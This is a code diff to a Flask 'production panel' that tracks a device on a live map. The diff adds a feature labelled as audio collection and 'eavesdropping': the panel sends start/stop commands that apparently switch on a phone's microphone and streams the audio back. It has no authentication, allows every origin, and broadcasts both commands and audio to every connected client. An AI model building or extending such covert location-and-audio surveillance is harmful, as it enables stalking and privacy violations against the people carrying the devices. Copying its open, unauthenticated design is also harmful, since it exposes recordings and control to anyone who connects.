@@ -1,7 +1,9 @@
 import os
 from flask import Flask, render_template_string, request, jsonify
+from flask_socketio import SocketIO, emit
 
 app = Flask(__name__)
+socketio = SocketIO(app, cors_allowed_origins="*")
 db_dispositivos = {}
 
 HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
@@ -12,6 +14,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
     <title>NEXOS CORE // PRODUCTION PANEL</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socketio/4.7.5/socketio.js"></script>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { background: #070f15; color: #e2e8f0; font-family: 'Courier New', monospace; padding: 15px; }
@@ -30,7 +33,10 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .info-box strong { font-size: 16px; color: #f1f5f9; }
         .map-container { width: 100%; height: 300px; border-radius: 8px; background: #040a0f; border: 1px solid #1e293b; margin-bottom: 15px; }
         .status-tag { background: #166534; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
-        .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; }
+        .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; margin-bottom: 10px; }
+        .btn-audio { display: block; width: 100%; background: #ea580c; color: #ffffff; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; cursor: pointer; }
+        .btn-audio.ativo { background: #dc2626; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -65,25 +71,51 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">
                     🗺️ Abrir no Google Maps
                 </a>
+
+                <button id="btnAudio" class="btn-audio" onclick="alternarAudio()">🎙️ Ativar Áudio Coleta</button>
+                <audio id="audioPlayer" autoplay></audio>
             </div>
 
             <script>
+                const socket = io();
                 let lastValidLat = {{ info_moto.lat }};
                 let lastValidLon = {{ info_moto.lon }};
+                let audioAtivo = false;
                 
                 const map = L.map('map_private', { zoomControl: false }).setView([lastValidLat, lastValidLon], 16);
                 L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {}).addTo(map);
                 let marker = L.marker([lastValidLat, lastValidLon]).addTo(map);
+
+                // Escuta os pacotes de áudio brutos vindo do servidor e joga no player
+                socket.on('stream_audio_painel', (data) => {
+                    if(!audioAtivo) return;
+                    const audioPlayer = document.getElementById('audioPlayer');
+                    audioPlayer.src = "data:audio/mp3;base64," + data.audio;
+                });
+
+                function alternarAudio() {
+                    const btn = document.getElementById('btnAudio');
+                    audioAtivo = !audioAtivo;
+                    
+                    if(audioAtivo) {
+                        btn.innerText = "🛑 Desativar Escuta";
+                        btn.classList.add('ativo');
+                        socket.emit('comando_audio', { device_id: '{{ id_buscado }}', acao: 'start' });
+                    } else {
+                        btn.innerText = "🎙️ Ativar Áudio Coleta";
+                        btn.classList.remove('ativo');
+                        socket.emit('comando_audio', { device_id: '{{ id_buscado }}', acao: 'stop' });
+                        document.getElementById('audioPlayer').src = "";
+                    }
+                }
 
                 setInterval(async () => {
                     try {
                         const response = await fetch('/api/status/' + '{{ id_buscado }}');
                         if (response.ok) {
                             const data = await response.json();
-                            
                             let nextLat = parseFloat(data.lat);
                             let nextLon = parseFloat(data.lon);
-                            
                             if (!nextLat || !nextLon) return;
                             
                             lastValidLat = nextLat;
@@ -144,6 +176,15 @@ def update():
     db_dispositivos[device_id]["lon"] = float(data.get("lon", -49.2648))
     return jsonify({"status": "success"}), 200
 
+# Eventos do SocketIO para repassar o áudio em tempo real
+@socketio.on('comando_audio')
+def handle_comando_audio(data):
+    emit('escutar_comando_celular', data, broadcast=True)
+
+@socketio.on('enviar_chunk_audio')
+def handle_chunk_audio(data):
+    emit('stream_audio_painel', data, broadcast=True)
+
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    socketio.run(app, host='0.0.0.0', port=port)
